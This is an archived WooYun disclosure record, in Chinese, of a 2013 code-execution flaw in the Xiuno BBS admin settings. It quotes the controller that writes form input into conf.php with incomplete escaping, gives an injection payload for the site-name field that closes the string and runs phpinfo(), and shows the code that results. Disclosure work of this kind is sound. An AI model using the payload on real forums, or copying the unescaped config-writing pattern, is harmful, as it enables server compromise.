{"id": 13318, "wybug_id": "wooyun-2013-019717", "wybug_title": "热个身，xiuno bbs后台代码执行漏洞", "wybug_corp": "Xiuno BBS", "wybug_author": "猪头子", "wybug_date": "2013-03-08 10:50", "wybug_open_date": "2013-04-22 10:50", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-04-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 官方介绍：Xiuno 这个名字来源于圣斗士星矢白羊座的黄金圣斗士修罗，他的攻击速度和战斗力是十二宫最强的，他是速度和力量的化身；在佛教里面，修罗为六道之一，处于人道和天道之间的一道，半人半神，性情刚烈，好战斗。我们取其寓意，希望XIUNO变得越来越强，越来越快。在 Xiuno BBS 的第一行代码开始（一共大约有4W多行代码，历时多年积累）对性能的追求就到了苛刻，完美，歇斯底里，神经质，作者本人经常因为权衡一个方案而陷入冥想状态，在千万级数据下，最终的程序执行速度基本控制在0.00x秒，是作者本人比较满意的。漏洞描述：xiuno后台在写入配置文件时出现漏洞，导致代码执行 详细说明：  \t1. 系统配置并非存放在数据库中，而是存放在conf.php中;\t2. 使用数组的方法存放;\t3. 有转义: ' => \\' ;\t4. '\\'没有转义;\t5. 插入\\'会被转义为\\\\'，php中\\\\表示一个\\，而单引号就逃脱了转义，因此可以闭合前面的数组;\t6. 该漏洞在后台管理中多次出现，包括灯鹭插件的设置中也出现。在admin/control/conf_control.class.php的on_base方法中：\npublic function on_base() {\t\tglobal $conf;\t\t$timezones = array(\t\t\t'+0' => '+0 ',\t\t\t'+1' => '+1 ',\t\t\t'+2' => '+2 ',\t\t\t'+3' => '+3 ',\t\t\t'+4' => '+4 ',\t\t\t'+5' => '+5 ',\t\t\t'+6' => '+6 ',\t\t\t'+7' => '+7 ',\t\t\t'+8' => '+8 北京时间',\t\t\t'+9' => '+9 ',\t\t\t'+10' => '+10 ',\t\t\t'+11' => '+11 ',\t\t\t'+12' => '+12 ',\t\t\t'+13' => '+13 ',\t\t\t'+14' => '+14 ',\t\t\t'+15' => '+15 ',\t\t\t'+16' => '+16 ',\t\t\t'+17' => '+17 ',\t\t\t'+18' => '+18 ',\t\t\t'+19' => '+19 ',\t\t\t'+20' => '+20 ',\t\t\t'+21' => '+21 ',\t\t\t'+22' => '+22 ',\t\t\t'+23' => '+23 ',\t\t);\t\t\t\t$input = array();\t\t$bbs = include BBS_PATH.'conf/conf.php';\t\t$error = $post = array();\t\t//获取用户提交的设置信息\t\tif($this->form_submit()) {\t\t\t$post['app_name'] = core::gpc('app_name', 'P');\t\t\t$post['urlrewrite'] = intval(core::gpc('urlrewrite', 'P'));\t\t\t$post['timeoffset'] = core::gpc('timeoffset', 'P');\t\t\t$post['upload_url'] = core::gpc('upload_url', 'P');\t\t\t$post['static_url'] = core::gpc('static_url', 'P');\t\t\t$post['credits_policy_post'] = intval(core::gpc('credits_policy_post', 'P'));\t\t\t$post['credits_policy_reply'] = intval(core::gpc('credits_policy_reply', 'P'));\t\t\t$post['golds_policy_reply'] = intval(core::gpc('golds_policy_reply', 'P'));\t\t\t$post['credits_policy_thread'] = intval(core::gpc('credits_policy_thread', 'P'));\t\t\t$post['credits_policy_digest_1'] = intval(core::gpc('credits_policy_digest_1', 'P'));\t\t\t$post['credits_policy_digest_2'] = intval(core::gpc('credits_policy_digest_2', 'P'));\t\t\t$post['credits_policy_digest_3'] = intval(core::gpc('credits_policy_digest_3', 'P'));\t\t\t$post['golds_policy_post'] = intval(core::gpc('golds_policy_post', 'P'));\t\t\t$post['golds_policy_thread'] = intval(core::gpc('golds_policy_thread', 'P'));\t\t\t$post['golds_policy_digest_1'] = intval(core::gpc('golds_policy_digest_1', 'P'));\t\t\t$post['golds_policy_digest_2'] = intval(core::gpc('golds_policy_digest_2', 'P'));\t\t\t$post['golds_policy_digest_3'] = intval(core::gpc('golds_policy_digest_3', 'P'));\t\t\t$post['cache_pid'] = intval(core::gpc('cache_pid', 'P'));\t\t\t$post['cache_tid'] = intval(core::gpc('cache_tid', 'P'));\t\t\t$post['app_brief'] = core::gpc('app_brief', 'P');\t\t\t$post['app_starttime'] = core::gpc('app_starttime', 'P');\t\t\t$post['tmp_path'] = core::gpc('tmp_path', 'P');\t\t\t$post['click_server'] = core::gpc('click_server', 'P');\t\t\t$post['reg_on'] = intval(core::gpc('reg_on', 'P'));\t\t\t$post['reg_email_on'] = intval(core::gpc('reg_email_on', 'P'));\t\t\t$post['reg_init_golds'] = intval(core::gpc('reg_init_golds', 'P'));\t\t\t$post['resetpw_on'] = intval(core::gpc('resetpw_on', 'P'));\t\t\t$post['app_copyright'] = core::gpc('app_copyright', 'P');\t\t\t$post['seo_title'] = core::gpc('seo_title', 'P');\t\t\t$post['seo_keywords'] = core::gpc('seo_keywords', 'P');\t\t\t$post['seo_description'] = core::gpc('seo_description', 'P');\t\t\t$post['threadlist_hotviews'] = intval(core::gpc('threadlist_hotviews', 'P'));\t\t\t$post['search_type'] = core::gpc('search_type', 'P');\t\t\t$post['sphinx_host'] = core::gpc('sphinx_host', 'P');\t\t\t$post['sphinx_port'] = core::gpc('sphinx_port', 'P');\t\t\t$post['sphinx_datasrc'] = core::gpc('sphinx_datasrc', 'P');\t\t\t$post['sphinx_deltasrc'] = core::gpc('sphinx_deltasrc', 'P');\t\t\t$post['china_icp'] = core::gpc('china_icp', 'P');\t\t\t$post['footer_js'] = core::gpc('footer_js', 'P');\t\t\t$post['site_pv'] = intval(core::gpc('site_pv', 'P'));\t\t\t$post['site_runlevel'] = intval(core::gpc('site_runlevel', 'P'));\t\t\t$post['forum_index_pagesize'] = intval(core::gpc('forum_index_pagesize', 'P'));\t\t\t\t\t\t// hook admin_conf_base_gpc_after.php\t\t\t\t\t\t// check 数据格式\t\t\t$error['app_name'] = $this->check_app_name($post['app_name']);\t\t\t\t\t\tif(misc::values_empty($error)) {\t\t\t\t$error = array();\t\t\t\tif($post['urlrewrite'] != $this->conf['urlrewrite']) {\t\t\t\t\t$this->clear_cache($this->conf['tmp_path'], 'bbs_');\t\t\t\t\t$this->clear_cache($this->conf['tmp_path'], 'bbsadmin_');\t\t\t\t\tif(!empty($post['urlrewrite']) && $post['urlrewrite'] != $bbs['urlrewrite']) {\t\t\t\t\t\t$testurl = $bbs['app_url'].'index.htm';\t\t\t\t\t\ttry {\t\t\t\t\t\t\t$html = misc::get_url($testurl);\t\t\t\t\t\t} catch(Exception $e) {\t\t\t\t\t\t\t$html = '';\t\t\t\t\t\t}\t\t\t\t\t\tif(strpos($html, '<html') === FALSE) {\t\t\t\t\t\t\t$post['urlrewrite'] = 0;\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t}\t\t\t\t\t\t\t\t//将配置写入到文件中\t\t\t\t$this->mconf->set_to('app_name', $post['app_name']);\t\t\t\t$this->mconf->set_to('urlrewrite', $post['urlrewrite']);\t\t\t\t$this->mconf->set_to('timeoffset', $post['timeoffset']);\t\t\t\t$this->mconf->set_to('upload_url', $post['upload_url']);\t\t\t\t$this->mconf->set_to('static_url', $post['static_url']);\t\t\t\t$this->mconf->set_to('click_server', $post['click_server']);\t\t\t\t$this->mconf->set_to('credits_policy_post', $post['credits_policy_post']);\t\t\t\t$this->mconf->set_to('credits_policy_reply', $post['credits_policy_reply']);\t\t\t\t$this->mconf->set_to('golds_policy_reply', $post['golds_policy_reply']);\t\t\t\t$this->mconf->set_to('credits_policy_thread', $post['credits_policy_thread']);\t\t\t\t$this->mconf->set_to('credits_policy_digest_1', $post['credits_policy_digest_1']);\t\t\t\t$this->mconf->set_to('credits_policy_digest_2', $post['credits_policy_digest_2']);\t\t\t\t$this->mconf->set_to('credits_policy_digest_3', $post['credits_policy_digest_3']);\t\t\t\t$this->mconf->set_to('golds_policy_post', $post['golds_policy_post']);\t\t\t\t$this->mconf->set_to('golds_policy_thread', $post['golds_policy_thread']);\t\t\t\t$this->mconf->set_to('golds_policy_digest_1', $post['golds_policy_digest_1']);\t\t\t\t$this->mconf->set_to('golds_policy_digest_2', $post['golds_policy_digest_2']);\t\t\t\t$this->mconf->set_to('golds_policy_digest_3', $post['golds_policy_digest_3']);\t\t\t\t$this->mconf->set_to('cache_pid', $post['cache_pid']);\t\t\t\t$this->mconf->set_to('cache_tid', $post['cache_tid']);\t\t\t\t$this->mconf->set_to('app_brief', $post['app_brief']);\t\t\t\t$this->mconf->set_to('app_starttime', $post['app_starttime']);\t\t\t\t$this->mconf->set_to('reg_on', $post['reg_on']);\t\t\t\t$this->mconf->set_to('reg_email_on', $post['reg_email_on']);\t\t\t\t$this->mconf->set_to('reg_init_golds', $post['reg_init_golds']);\t\t\t\t$this->mconf->set_to('resetpw_on', $post['resetpw_on']);\t\t\t\t$this->mconf->set_to('app_copyright', $post['app_copyright']);\t\t\t\t$this->mconf->set_to('seo_title', $post['seo_title']);\t\t\t\t$this->mconf->set_to('seo_keywords', $post['seo_keywords']);\t\t\t\t$this->mconf->set_to('seo_description', $post['seo_description']);\t\t\t\t$this->mconf->set_to('threadlist_hotviews', $post['threadlist_hotviews']);\t\t\t\t$this->mconf->set_to('search_type', $post['search_type']);\t\t\t\t$this->mconf->set_to('sphinx_host', $post['sphinx_host']);\t\t\t\t$this->mconf->set_to('sphinx_port', $post['sphinx_port']);\t\t\t\t$this->mconf->set_to('sphinx_datasrc', $post['sphinx_datasrc']);\t\t\t\t$this->mconf->set_to('sphinx_deltasrc', $post['sphinx_deltasrc']);\t\t\t\t$this->mconf->set_to('china_icp', $post['china_icp']);\t\t\t\t$this->mconf->set_to('footer_js', $post['footer_js']);\t\t\t\t$this->mconf->set_to('site_pv', $post['site_pv']);\t\t\t\t$this->mconf->set_to('site_runlevel', $post['site_runlevel']);\t\t\t\t$this->mconf->set_to('forum_index_pagesize', $post['forum_index_pagesize']);\t\t\t\t\t\t\t\t// hook admin_conf_base_set_after.php\t\t\t\t\t\t\t\t//$this->mconf->set_to('tmp_path', $post['tmp_path']);\t\t\t\t$this->mconf->save();\t\t\t}\t\t\t\t\t\t// 删除模板缓存\t\t\t$this->truncate_tpl_cache();\t\t}\t\t。。。\t}\n直接写入到了文件中，由于过滤不严，我们用\\'即可绕过单引号过滤，达到闭合单引号的目的。   漏洞证明：  设置 -> 基本设置 -> 站点名称 加上 \\',)&&phpinfo();/* (其他地方应该也可以，没测试)\n\n这样就在conf/conf.php中写入了如下代码：      return array (        ......       // 唯一识别ID       'app_id' => 'bbs' ,        // 站点名称       'app_name' => 'Xiuno BBS \\\\' ,)&&phpinfo();/*',     形成了return array() && phpinfo();     通过使用&&达到执行命令的目地.\n\n   修复方案：  如果要将配置放入到文件中的话，做好过滤措施   版权声明：转载请注明来源 猪头子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-03-08 16:31 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  配置文件写shell?关注下..    \n     2013-03-08 17:56 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  热身完了呢    \n     2013-03-08 19:39 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  围观 ：）    \n     2013-03-08 22:02 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @xsser 热身完了就撤，哈哈    \n     2013-03-08 22:04 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  @yy520 围观你妹啊擦，装什么路人啊擦    \n     2013-03-09 10:53 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  @猪头子 好吧，我是你的马甲    \n     2013-04-24 02:02 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  被忽略了。。以后不提交这货的漏洞了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}